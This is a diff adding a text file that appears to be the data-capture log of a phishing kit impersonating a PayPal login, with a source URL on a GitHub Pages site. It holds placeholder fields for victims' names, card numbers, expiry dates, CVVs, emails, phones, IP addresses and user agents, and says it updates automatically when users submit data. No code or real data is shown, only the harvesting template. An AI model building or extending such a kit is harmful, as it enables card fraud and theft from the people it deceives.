@@ -1,0 +1,16 @@
+PayPal Card Information
+Time: Ready for data collection
+IP: Waiting for first submission
+Source: https://sikahh.github.io/sikahh-paypallogin
+
+Name: [Waiting for data]
+Card: [Waiting for data]
+Expiry: [Waiting for data]
+CVV: [Waiting for data]
+Email: [Waiting for data]
+Phone: [Waiting for data]
+Amount: $100
+
+User-Agent: [Waiting for data]
+
+--- This file will be updated automatically when users submit data ---
